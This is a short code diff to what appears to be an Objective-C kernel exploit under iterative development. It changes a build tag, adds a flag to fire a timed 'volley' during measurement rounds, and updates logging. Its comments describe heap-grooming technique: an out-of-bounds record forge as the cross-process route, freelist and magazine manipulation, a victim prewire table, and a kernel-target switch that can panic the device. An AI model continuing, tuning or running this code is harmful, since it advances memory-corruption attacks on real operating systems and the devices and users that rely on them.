@@ -181,7 +181,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P088_BUILD @"p088-write-hop-v18-bullets"
+#define P088_BUILD @"p088-write-hop-v19-b-consume"
 
 /* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
 #define P088_KERNEL_TARGET 0
@@ -225,6 +225,15 @@
    dispatch, so B owns the spill target from ~1ms onward). */
 #define P088_VOL_CONV        24u
 #define P088_VOL_CONV_STEP   0.7
+/* v19 B-in-measure (tonight's law chain): the sid-lookup is task-scoped
+   (device-proven on 24A435's guest-loop) so the ONLY cross-proc route =
+   the OOB record forge — and the only observable victim = B's LIVE
+   prewire table via its own [fill->map] windows bracketing A's fill.
+   1 = fire the volley in MEASURE rounds too (24 x 0.7ms per round,
+   bounded; no witness punch in measure rounds — conv retains it). */
+#ifndef P088_B_IN_MEASURE
+#define P088_B_IN_MEASURE 1
+#endif
 
 /* staging-band second oracle (105) */
 #define P088_STAGE_SCAN_N    256u
@@ -1018,12 +1027,13 @@ static NSString *p088_yfmt(double y) {
            rounds skip B entirely (B churn between rounds pollutes the
            freelist and would eat A's released chunks). */
         BOOL conv = (witness >= 0 && run[witness].alive && !convDead);
-        uint32_t nFires = conv ? P088_VOL_CONV : 0;
+        uint32_t nFires = (conv || P088_B_IN_MEASURE) ? P088_VOL_CONV : 0;
         double stepMs   = P088_VOL_CONV_STEP;
         double baseMs   = P088_VOL_FIRST_MS;
 
-        p088_log(@"[r%u] %s: fires=%u step=%.1fms first@%.2fms (A prior %.1fms)",
-                 r, conv ? "CONV" : "MEASURE", nFires, stepMs, baseMs, lastATms);
+        p088_log(@"[r%u] %s: fires=%u step=%.1fms first@%.2fms (A prior %.1fms)%s",
+                 r, conv ? "CONV" : "MEASURE", nFires, stepMs, baseMs, lastATms,
+                 (!conv && P088_B_IN_MEASURE && nFires) ? "  [v19] B-arm in MEASURE (consume-forge window)" : "");
 
         /* --- v7 punch schedule ---
            v13: prefill 6 same-CPU magazine frees FIRST so the round's two
